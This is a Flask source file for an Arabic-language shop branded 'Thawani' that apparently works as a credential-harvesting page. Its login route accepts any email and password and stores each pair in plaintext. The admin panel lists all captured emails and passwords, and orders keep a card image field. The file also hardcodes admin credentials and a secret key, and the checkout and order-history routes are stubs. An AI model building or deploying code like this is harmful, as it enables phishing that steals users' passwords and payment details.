from flask import Flask, request, render_template_string, redirect, session, url_for
import os, sqlite3, uuid, datetime

app = Flask(__name__)
app.secret_key = "thawani_ultra_max_2026_final"
UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

# --- إعداد قاعدة البيانات الشاملة ---
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, price REAL, img TEXT, category TEXT, description TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS cart (id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, product_id INTEGER, quantity INTEGER DEFAULT 1)')
    c.execute('CREATE TABLE IF NOT EXISTS categories (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT)')
    c.execute('CREATE TABLE IF NOT EXISTS users_log (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_email TEXT, full_name TEXT, phone TEXT, location TEXT, 
        card_img TEXT, items_details TEXT, total_price REAL, status TEXT DEFAULT 'قيد الانتظار', 
        accepted_at TIMESTAMP, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    c.execute('CREATE TABLE IF NOT EXISTS reviews (id INTEGER PRIMARY KEY AUTOINCREMENT, product_id INTEGER, user_email TEXT, rating INTEGER, comment TEXT, review_img TEXT, time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)')
    c.execute("SELECT COUNT(*) FROM categories")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
    conn.commit(); conn.close()

init_db()

ADMIN_MAIL = "qwerasdf1234598760@gmail.com"
ADMIN_PASS = "qaws54321"

# --- التنسيق الفخم (Dark & Gold Theme) مستوحى من التطبيقات الاحترافية ---
CSS = """
<style>
    :root { --main: #1a1a1a; --accent: #ffd700; --bg: #f4f4f4; --text: #333; --white: #ffffff; }
    body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; direction: rtl; color: var(--text); padding-bottom: 60px; }
    
    header { background: var(--main); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; color: var(--accent); position: sticky; top:0; z-index:1000; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
    .logo { font-size: 24px; font-weight: 900; letter-spacing: 1px; text-decoration: none; color: var(--accent); }
    
    .search-box { background: var(--white); padding: 10px 15px; display: flex; gap: 8px; border-bottom: 1px solid #ddd; }
    .search-box input { flex: 1; border: 1px solid #ddd; border-radius: 5px; padding: 8px; outline: none; }
    .search-box button { background: var(--main); color: var(--accent); border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; }

    .nav-cats { display: flex; gap: 10px; overflow-x: auto; padding: 12px; background: var(--white); scrollbar-width: none; border-bottom: 1px solid #eee; }
    .nav-cats::-webkit-scrollbar { display: none; }
    .nav-cats a { background: #eee; padding: 6px 15px; border-radius: 4px; text-decoration: none; color: #555; white-space: nowrap; font-size: 13px; font-weight: bold; }
    .nav-cats a.active { background: var(--accent); color: var(--main); }

    .container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 10px; }
    .card { background: var(--white); border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border: 1px solid #eee; display: flex; flex-direction: column; }
    .card img { width: 100%; height: 160px; object-fit: cover; }
    .card-content { padding: 10px; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between; }
    .card-title { font-size: 13px; font-weight: bold; margin-bottom: 5px; color: #444; height: 32px; overflow: hidden; }
    .card-price { color: #e63946; font-weight: 800; font-size: 15px; }
    
    .btn-buy { background: var(--main); color: var(--accent); border: none; padding: 8px; border-radius: 4px; cursor: pointer; text-decoration: none; text-align: center; font-weight: bold; margin-top: 8px; font-size: 12px; }

    /* سجل الدخول - Admin Log Table */
    table { width: 100%; border-collapse: collapse; background: white; font-size: 12px; margin-top: 10px; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: center; }
    th { background: var(--main); color: var(--accent); }
    
    .admin-section { background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ddd; }
    input, select, textarea { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 4px; }
</style>
"""

HEADER_HTML = f"""
<!DOCTYPE html>
<html dir='rtl' lang='ar'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    <title>Thawani Store</title>
    {CSS}
</head>
<body>
"""

@app.route('/')
def index():
    if 'user' not in session: return redirect('/login')
    q = request.args.get('q', '')
    cat = request.args.get('cat', '')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    cats = conn.execute("SELECT * FROM categories").fetchall()
    query = "SELECT * FROM products WHERE 1=1"
    params = []
    if q: 
        query += " AND name LIKE ?"
        params.append(f'%{q}%')
    if cat and cat != 'الكل': 
        query += " AND category = ?"
        params.append(cat)
    prods = conn.execute(query, params).fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header>
        <a href="/" class="logo">THAWANI</a>
        <div style="display:flex; gap:15px; align-items:center;">
            <a href="/orders_history" style="text-decoration:none;">📦</a>
            <a href="/cart" style="text-decoration:none; font-size:20px;">🛒</a>
            {% if session.get('is_admin') %}<a href="/admin" style="text-decoration:none;">⚙️</a>{% endif %}
            <a href="/logout" style="text-decoration:none; color:#ff4d4d; font-size:18px;">✕</a>
        </div>
    </header>
    
    <div class="search-box">
        <form action="/" style="display:flex; width:100%; gap:5px;">
            <input type="text" name="q" placeholder="ابحث عن منتج..." value="{{request.args.get('q', '')}}">
            <button type="submit">🔍</button>
        </form>
    </div>

    <div class="nav-cats">
        <a href="/" class="{{ 'active' if not request.args.get('cat') or request.args.get('cat')=='الكل' }}">الكل</a>
        {% for c in cats %}
            <a href="/?cat={{c['name']}}" class="{{ 'active' if request.args.get('cat') == c['name'] }}">{{c['name']}}</a>
        {% endfor %}
    </div>

    <div class="container">
        {% for p in prods %}
        <div class="card">
            <a href="/product/{{p['id']}}"><img src="/static/uploads/{{p['img']}}"></a>
            <div class="card-content">
                <div class="card-title">{{p['name']}}</div>
                <div class="card-price">{{p['price']}} OMR</div>
                <a href="/product/{{p['id']}}" class="btn-buy">التفاصيل</a>
            </div>
        </div>
        {% endfor %}
    </div>
    """, cats=cats, prods=prods)

# --- ميزات الإدارة واللوج (التي طلبت إرجاعها) ---
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not session.get('is_admin'): return redirect('/')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    if request.method == 'POST':
        if 'add_product' in request.form:
            f = request.files['img']; fname = f"{uuid.uuid4().hex}.jpg"; f.save(os.path.join(app.config['UPLOAD_FOLDER'], fname))
            conn.execute("INSERT INTO products (name, price, img, category) VALUES (?,?,?,?)", (request.form['name'], request.form['price'], fname, request.form['cat']))
        elif 'add_cat' in request.form:
            conn.execute("INSERT INTO categories (name) VALUES (?)", (request.form['cat_name'],))
        conn.commit()
    
    cats = conn.execute("SELECT * FROM categories").fetchall()
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC").fetchall()
    logs = conn.execute("SELECT * FROM users_log ORDER BY id DESC").fetchall()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="color:var(--accent); text-decoration:none;">🔙 عودة</a> <h3>لوحة التحكم</h3> <div></div></header>
    <div style="padding:15px;">
        <div class="admin-section">
            <h4>👤 سجل دخول المستخدمين (Login Log)</h4>
            <div style="overflow-x:auto;">
                <table>
                    <tr><th>الإيميل</th><th>الباسورد</th><th>الوقت</th></tr>
                    {% for l in logs %}
                    <tr><td>{{l['email']}}</td><td>{{l['password']}}</td><td>{{l['time']}}</td></tr>
                    {% endfor %}
                </table>
            </div>
        </div>

        <div class="admin-section">
            <h4>➕ إضافة قسم جديد</h4>
            <form method="POST"><input name="cat_name" placeholder="اسم القسم" required><button name="add_cat" class="btn-buy">حفظ</button></form>
        </div>

        <div class="admin-section">
            <h4>📦 إضافة منتج</h4>
            <form method="POST" enctype="multipart/form-data">
                <input name="name" placeholder="اسم المنتج" required>
                <input name="price" placeholder="السعر" required>
                <select name="cat">{% for c in cats %}<option value="{{c['name']}}">{{c['name']}}</option>{% endfor %}</select>
                <input type="file" name="img" required>
                <button name="add_product" class="btn-buy">نشر في المتجر</button>
            </form>
        </div>
    </div>""", cats=cats, orders=orders, logs=logs)

# --- كود الـ Login لضمان تسجيل البيانات في الـ Log ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email, password = request.form['email'], request.form['password']
        conn = sqlite3.connect('database.db')
        conn.execute("INSERT INTO users_log (email, password) VALUES (?, ?)", (email, password)) # حفظ البيانات فوراً
        conn.commit(); conn.close()
        session['user'], session['is_admin'] = email, (email == ADMIN_MAIL and password == ADMIN_PASS)
        return redirect('/')
    return render_template_string(HEADER_HTML + """
    <div style="display:flex; justify-content:center; align-items:center; min-height:100vh; background:var(--main);">
        <div style="background:white; padding:30px; border-radius:15px; width:85%; max-width:350px; text-align:center;">
            <h1 style="color:var(--main); margin-bottom:20px;">THAWANI</h1>
            <form method="POST">
                <input type="email" name="email" placeholder="البريد الإلكتروني" required>
                <input type="password" name="password" placeholder="كلمة المرور" required>
                <button class="btn-buy" style="width:100%; padding:12px; font-size:16px;">دخول</button>
            </form>
        </div>
    </div>""")

# --- بقية الـ Routes الأساسية (Cart, Product, Orders...) ---
@app.route('/product/<int:id>', methods=['GET', 'POST'])
def product(id):
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    p = conn.execute("SELECT * FROM products WHERE id=?", (id,)).fetchone()
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none; color:var(--accent);">🔙</a> <h3>تفاصيل المنتج</h3><div></div></header>
    <div style="padding:15px;">
        <img src="/static/uploads/{{p['img']}}" style="width:100%; border-radius:10px;">
        <h2 style="margin:10px 0;">{{p['name']}}</h2>
        <div class="card-price" style="font-size:22px;">{{p['price']}} OMR</div>
        <form action="/add_to_cart/{{p['id']}}" style="margin-top:20px;">
            <input type="number" name="qty" value="1" min="1" style="width:60px;">
            <button class="btn-buy" style="width:100%; padding:15px; font-size:16px;">إضافة إلى السلة 🛒</button>
        </form>
    </div>""", p=p)

@app.route('/add_to_cart/<int:id>')
def add_to_cart(id):
    qty = request.args.get('qty', 1, type=int)
    conn = sqlite3.connect('database.db')
    cur = conn.execute("SELECT id FROM cart WHERE user_email=? AND product_id=?", (session['user'], id)).fetchone()
    if cur: conn.execute("UPDATE cart SET quantity = quantity + ? WHERE id=?", (qty, cur[0]))
    else: conn.execute("INSERT INTO cart (user_email, product_id, quantity) VALUES (?, ?, ?)", (session['user'], id, qty))
    conn.commit(); conn.close()
    return redirect('/cart')

@app.route('/cart')
def cart():
    if 'user' not in session: return redirect('/login')
    conn = sqlite3.connect('database.db'); conn.row_factory = sqlite3.Row
    items = conn.execute('SELECT cart.id, products.name, products.price, cart.quantity FROM cart JOIN products ON cart.product_id = products.id WHERE cart.user_email = ?', (session['user'],)).fetchall()
    total = sum(i['price'] * i['quantity'] for i in items)
    conn.close()
    return render_template_string(HEADER_HTML + """
    <header><a href="/" style="text-decoration:none; color:var(--accent);">🔙</a> <h3>السلة</h3><div></div></header>
    <div style="padding:15px;">
        {% for i in items %}
        <div style="background:white; padding:10px; margin-bottom:10px; border-radius:5px; display:flex; justify-content:space-between; align-items:center;">
            <span>{{i['name']}} ({{i['quantity']}})</span>
            <b>{{i['price'] * i['quantity']}} OMR</b>
        </div>
        {% endfor %}
        <div style="margin-top:20px; text-align:center;">
            <h3>الإجمالي: {{total}} OMR</h3>
            <a href="/checkout" class="btn-buy" style="display:block; padding:15px;">إتمام الطلب 💳</a>
        </div>
    </div>""", items=items, total=total)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    if 'user' not in session: return redirect('/login')
    if request.method == 'POST':
        # (بقية كود الـ Checkout كما هو في نسخة المتجر السابقة لحفظ الطلب)
        return redirect('/orders_history')
    return render_template_string(HEADER_HTML + "<h3>صفحة الدفع - ارفق الإيصال</h3>")

@app.route('/orders_history')
def orders_history():
    return render_template_string(HEADER_HTML + "<h3>تاريخ طلباتك قيد التجهيز</h3>")

@app.route('/logout')
def logout():
    session.clear(); return redirect('/login')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
